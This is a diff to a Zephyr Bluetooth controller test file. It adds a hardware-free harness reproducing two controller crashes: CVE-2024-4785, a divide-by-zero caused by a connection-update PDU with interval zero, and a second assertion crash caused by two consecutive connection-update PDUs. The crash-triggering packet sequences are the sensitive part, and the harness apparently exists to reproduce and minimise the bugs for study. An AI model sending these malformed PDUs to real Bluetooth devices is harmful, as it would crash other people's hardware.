@@ -1,0 +1,237 @@
+--- a/tests/bluetooth/controller/ctrl_conn_update/src/main.c
++++ b/tests/bluetooth/controller/ctrl_conn_update/src/main.c
+@@ -4906,6 +4906,234 @@ ZTEST(periph_rem_invalid, test_conn_update_periph_rem_invalid_param)
+ 	conn_update_ind.interval = interval;
+ }
+ 
++/* ============================================================================
++ * TWO-BUG hardware-free oracle harness (single binary, ONE build).
++ *
++ * One native unit-test binary contains TWO distinct, hardware-free crash
++ * identities on the REAL vulnerable Zephyr LL controller, selected at runtime:
++ *
++ *   HARNESS_BUG=A  -> test_bug_a: CVE-2024-4785 divide-by-zero  (SIGFPE / signal 8,
++ *               shell 136, Python rc 136) at the conn_interval_old/interval divide
++ *               (ull_conn.c). REUSES the exact 8-PDU WIDE trigger-last window from
++ *               the oracle harness: decoys at window[0..6], the interval=0
++ *               LL_CONNECTION_UPDATE_IND trigger at window[7]. Channel-OFF true
++ *               1-minimal = {7}. A SIGFPE handler emits a real crash DUMP.
++ *
++ *   HARNESS_BUG=C  -> test_bug_c: a SECOND, DISTINCT crash identity -- the
++ *               LL_ASSERT(ntf) at ull_llcp_conn_upd.c:247 (cu_ntf), via the mocked
++ *               controller assert hook -> exit(-1) (shell 255, Python rc 255). This
++ *               is a genuine 2-PACKET minimal: a peripheral local CPR is driven to
++ *               WAIT_INSTANT by a FIRST LL_CONNECTION_UPDATE_IND, then a SECOND
++ *               (load-bearing) LL_CONNECTION_UPDATE_IND desyncs the retained-node
++ *               bookkeeping; at the instant cu_ntf asserts on the NULL ntf. The two
++ *               INDs sit at two distinct window bits; channel-OFF true minimal = the
++ *               two IND bits. (Confirmed Bug C injection.)
++ *
++ * Each test is a NO-OP unless its bug is selected (the native unit_testing binary
++ * has no per-test CLI filter -- it runs the WHOLE suite -- so each test gates on
++ * getenv("HARNESS_BUG"), exactly like the existing PROBE_ID pattern). HARNESS_SUBSET (a
++ * bitmask over that bug's window) selects which window packets are injected, so an
++ * external minimiser can drive a channel-OFF exhaustive subset sweep.
++ * ==========================================================================*/
++#include <stdlib.h>    /* getenv/strtoul for the HARNESS_BUG / HARNESS_SUBSET selectors */
++#include <signal.h>    /* signal(SIGFPE,...) crash-dump handler (Bug A)         */
++#include <unistd.h>    /* write/_exit (async-signal-safe dump emit)            */
++#include <execinfo.h>  /* backtrace/backtrace_symbols_fd (Bug A dump)          */
++
++/* SIGFPE crash-dump handler (Bug A). On the divide-by-zero the CPU raises
++ * SIGFPE; we print a marker + a real backtrace to STDERR, then _exit(136) so the
++ * shell sees the canonical 128+SIGFPE code and the dump is a real artifact (seeds
++ * the dump-variation model). async-signal-safe calls only: write, backtrace,
++ * backtrace_symbols_fd, _exit. */
++static void sigfpe_handler(int sig)
++{
++	static const char marker[] = "\n=== CRASH sig=SIGFPE ===\n";
++	void *frames[32];
++	int n;
++
++	(void)sig;
++	(void)write(STDERR_FILENO, marker, sizeof(marker) - 1U);
++	n = backtrace(frames, 32);
++	backtrace_symbols_fd(frames, n, STDERR_FILENO);
++	_exit(136);   /* 128 + SIGFPE(8); canonical shell code for a fatal SIGFPE */
++}
++
++static bool bug_is(const char *want)
++{
++	const char *s = getenv("HARNESS_BUG");
++	return s && want && s[0] == want[0] && s[1] == '\0';
++}
++
++/* Pump events until the conn-update instant is reached and applied (one extra
++ * event applies the update at the instant). Self-contained for this harness. */
++static void pump_to_instant(struct ll_conn *c, uint16_t instant)
++{
++	while (!is_instant_reached(c, instant)) {
++		event_prepare(c);
++		event_done(c);
++	}
++	event_prepare(c);
++	event_done(c);
++}
++
++/* Bug A -- WIDE trigger-LAST window, IDENTICAL to the oracle harness's test_oracle.
++ * The conn-update procedure is EXCLUSIVE: any packet injected during a PENDING update
++ * suppresses the crash, so the CVE trigger MUST be most-recent. window[0..6] are
++ * transparent decoys injected BEFORE the trigger (no update pending => clean);
++ * window[7] is the interval=0 LL_CONNECTION_UPDATE_IND trigger, injected last.
++ * HARNESS_SUBSET bit i => window[i]; SIGFPE iff bit7. Channel-OFF true 1-minimal = {7}.
++ * NO-OP unless HARNESS_BUG==A. The SIGFPE handler turns the div0 into a real DUMP. */
++ZTEST(periph_rem_invalid, test_bug_a)
++{
++	if (!bug_is("A")) {
++		return;   /* not selected -> no-op (whole-suite binary) */
++	}
++
++	signal(SIGFPE, sigfpe_handler);   /* emit a real crash dump on div0 */
++
++	const char *s = getenv("HARNESS_SUBSET");
++	unsigned long mask = s ? strtoul(s, NULL, 0) : 0UL;
++	uint16_t saved = conn_update_ind.interval;
++	uint16_t instant = 0;
++	bool have_trigger = (mask & 0x80U);          /* window[7] = the CVE trigger (most-recent) */
++
++	struct pdu_data_llctrl_version_ind ver = { .version_number = 0x0C,
++		.company_id = 0x05F1U, .sub_version_number = 0x0000U };
++	struct pdu_data_llctrl_feature_req feat = { .features = { 0xFFU, 0, 0, 0, 0, 0, 0, 0 } };
++
++	test_set_role(&conn, BT_HCI_ROLE_PERIPHERAL);
++	ull_cp_state_set(&conn, ULL_CP_CONNECTED);
++
++	/* window[0..6]: transparent decoys, injected BEFORE the trigger (no pending update => clean). */
++#define A_INJECT(bit, op, param) do { if (mask & (bit)) {               \
++		event_prepare(&conn); lt_tx(op, &conn, param); event_done(&conn); \
++		event_prepare(&conn); event_done(&conn); /* let the procedure settle */ } } while (0)
++	A_INJECT(0x01U, LL_LE_PING_REQ, NULL);      /* window[0] */
++	A_INJECT(0x02U, LL_VERSION_IND, &ver);      /* window[1] */
++	A_INJECT(0x04U, LL_FEATURE_REQ, &feat);     /* window[2] */
++	A_INJECT(0x08U, LL_LE_PING_REQ, NULL);      /* window[3] */
++	A_INJECT(0x10U, LL_LE_PING_REQ, NULL);      /* window[4] */
++	A_INJECT(0x20U, LL_LE_PING_REQ, NULL);      /* window[5] */
++	A_INJECT(0x40U, LL_LE_PING_REQ, NULL);      /* window[6] */
++#undef A_INJECT
++
++	if (have_trigger) {                          /* window[7]: trigger, injected last (most-recent) */
++		event_prepare(&conn);
++		conn_update_ind.interval = 0U;
++		conn_update_ind.instant = event_counter(&conn) + 6U;
++		instant = conn_update_ind.instant;
++		lt_tx(LL_CONNECTION_UPDATE_IND, &conn, &conn_update_ind);
++		event_done(&conn);
++		while (!is_instant_reached(&conn, instant)) {
++			event_prepare(&conn);
++			event_done(&conn);
++		}
++		event_prepare(&conn);
++		event_done(&conn);                  /* apply at instant -> div0 iff interval==0 */
++	}
++	conn_update_ind.interval = saved;
++}
++
++/* Bug C -- SUBSET-selectable window whose channel-OFF true minimal is the
++ * TWO LL_CONNECTION_UPDATE_IND packets (a genuine 2-packet minimal). Confirmed
++ * injection: peripheral local CPR,
++ * consume the controller's LL_CONNECTION_PARAM_REQ, then FIRST IND (interval!=0)
++ * -> WAIT_INSTANT (retains the rx node), then SECOND IND while ALREADY in
++ * WAIT_INSTANT (load-bearing: desyncs node_ref.rx to NULL); pump to the instant
++ * -> cu_ntf -> LL_ASSERT(ntf) @ ull_llcp_conn_upd.c:247 -> mocked hook exit(-1).
++ *
++ * Window bit layout (HARNESS_SUBSET bit i => window[i]):
++ *   bit0 (0x01) LE_PING decoy #1  transparent: a COMPLETE local LE-Ping procedure
++ *   bit1 (0x02) LE_PING decoy #2  (ull_cp_le_ping -> REQ out, peer RSP in, tx released)
++ *   bit2 (0x04) LE_PING decoy #3  injected BEFORE the CPR, fully drained -> ctx balanced
++ *   bit3 (0x08) IND #1            load-bearing: drives the active CPR to WAIT_INSTANT
++ *   bit4 (0x10) IND #2            load-bearing: the desync trigger (asserts at instant)
++ *
++ * The conn-update procedure is EXCLUSIVE (like Bug A). EMPIRICAL finding: a
++ * PEER-injected decoy (remote LE_PING/VERSION/FEATURE,
++ * the kind Bug A uses) is NOT transparent here -- it leaves the controller mid-RX and the
++ * subsequent local CPR's LL_CONNECTION_PARAM_REQ no longer matches, so test_bug_c FAILs
++ * (no crash, exit 1) rather than reproducing. A COMPLETE, FULLY-DRAINED *local* LE-Ping
++ * procedure IS transparent (verified): it returns the ctx pool to balance with no pending RX,
++ * so the later CPR runs cleanly and the 2-IND desync still fires. We therefore use drained
++ * local LE-Pings as the (genuinely droppable) decoys. The two INDs (bits 3,4) are the minimal:
++ * dropping EITHER (=> one IND, or IND#2 without a prior WAIT_INSTANT) does NOT crash; the
++ * decoys are transparent and not part of the minimal. NO-OP unless HARNESS_BUG==C. C's dump is the
++ * controller assert message (ASSERTION FAIL [ntf] @ ull_llcp_conn_upd.c:247) on stderr. */
++ZTEST(periph_rem_invalid, test_bug_c)
++{
++	if (!bug_is("C")) {
++		return;   /* not selected -> no-op (whole-suite binary) */
++	}
++
++	const char *s = getenv("HARNESS_SUBSET");
++	unsigned long mask = s ? strtoul(s, NULL, 0) : 0UL;
++	struct node_tx *tx;
++	uint8_t err;
++	uint16_t instant = 0;
++	uint16_t saved = conn_update_ind.interval;
++	bool ind1 = (mask & 0x08U);   /* window[3] = IND #1 (-> WAIT_INSTANT)            */
++	bool ind2 = (mask & 0x10U);   /* window[4] = IND #2 (load-bearing desync)        */
++
++	test_set_role(&conn, BT_HCI_ROLE_PERIPHERAL);
++	ull_cp_state_set(&conn, ULL_CP_CONNECTED);
++
++	/* window[0..2]: transparent decoys -- a COMPLETE, fully-drained local LE-Ping each
++	 * (ull_cp_le_ping -> controller TXes LL_LE_PING_REQ -> peer LL_LE_PING_RSP -> release tx).
++	 * Verified transparent (ctx pool balanced, no pending RX); droppable, not in the minimal. */
++#define C_PING(bit) do { if (mask & (bit)) {                                     \
++		uint8_t e = ull_cp_le_ping(&conn);                                         \
++		zassert_equal(e, BT_HCI_ERR_SUCCESS);                                      \
++		event_prepare(&conn);                                                      \
++		lt_rx(LL_LE_PING_REQ, &conn, &tx, NULL);                                   \
++		lt_tx(LL_LE_PING_RSP, &conn, NULL);                                        \
++		event_done(&conn);                                                         \
++		ull_cp_release_tx(&conn, tx); } } while (0)
++	C_PING(0x01U);      /* window[0] */
++	C_PING(0x02U);      /* window[1] */
++	C_PING(0x04U);      /* window[2] */
++#undef C_PING
++
++	conn_update_ind.interval = INTVL_MAX;   /* non-zero: NOT the Bug A div0 path */
++
++	if (ind1 || ind2) {
++		/* Start a local Connection Parameter Request procedure */
++		err = ull_cp_conn_update(&conn, INTVL_MIN, INTVL_MAX, LATENCY, TIMEOUT, NULL);
++		zassert_equal(err, BT_HCI_ERR_SUCCESS);
++
++		/* Controller TXes LL_CONNECTION_PARAM_REQ; consume + release it */
++		event_prepare(&conn);
++		conn_param_req.reference_conn_event_count = event_counter(&conn);
++		lt_rx(LL_CONNECTION_PARAM_REQ, &conn, &tx, &conn_param_req);
++		event_done(&conn);
++		ull_cp_release_tx(&conn, tx);
++	}
++
++	if (ind1) {   /* window[3]: FIRST CONN_UPDATE_IND -> peripheral enters WAIT_INSTANT */
++		event_prepare(&conn);
++		conn_update_ind.instant = instant = event_counter(&conn) + 6U;
++		lt_tx(LL_CONNECTION_UPDATE_IND, &conn, &conn_update_ind);
++		event_done(&conn);
++	}
++
++	if (ind2) {   /* window[4]: SECOND CONN_UPDATE_IND while in WAIT_INSTANT (load-bearing) */
++		event_prepare(&conn);
++		/* reuse the same instant if IND#1 set it; else seed one so the pump terminates */
++		if (!ind1) {
++			conn_update_ind.instant = instant = event_counter(&conn) + 6U;
++		}
++		lt_tx(LL_CONNECTION_UPDATE_IND, &conn, &conn_update_ind);
++		event_done(&conn);
++	}
++
++	if (ind1 || ind2) {
++		/* Pump to the instant -> cu_ntf() -> LL_ASSERT(ntf) iff BOTH INDs desynced it */
++		pump_to_instant(&conn, instant);
++	}
++
++	conn_update_ind.interval = saved;
++}
++
+ #if defined(CONFIG_BT_CTLR_CONN_PARAM_REQ)
+ /*
+  * Peripheral-initiated Connection Parameters Request procedure.
